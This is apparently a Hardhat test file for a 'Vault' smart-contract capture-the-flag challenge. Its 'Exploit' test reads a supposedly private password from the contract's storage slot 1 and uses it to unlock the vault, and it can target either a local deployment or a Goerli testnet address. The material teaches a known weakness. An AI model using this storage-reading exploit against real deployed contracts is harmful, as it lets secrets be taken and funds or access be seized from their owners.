const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Vault', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Vault');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Vault', deployer);
            this.target = await ContractFactory.deploy(ethers.utils.formatBytes32String("secureP@ssw0rd!!@@#$%^&*IOLKMNG"));
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        let password = await ethers.provider.getStorageAt(this.target.address, 1);
        console.log(`\t password: ${password}`);
        console.log(`\t unlocking...`);
        let unlockTX = await this.target.connect(attacker).unlock(password); await unlockTX.wait();
        console.log(`\t Is locked: ${await this.target.locked()}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.locked()).to.be.eq(false);
    });
});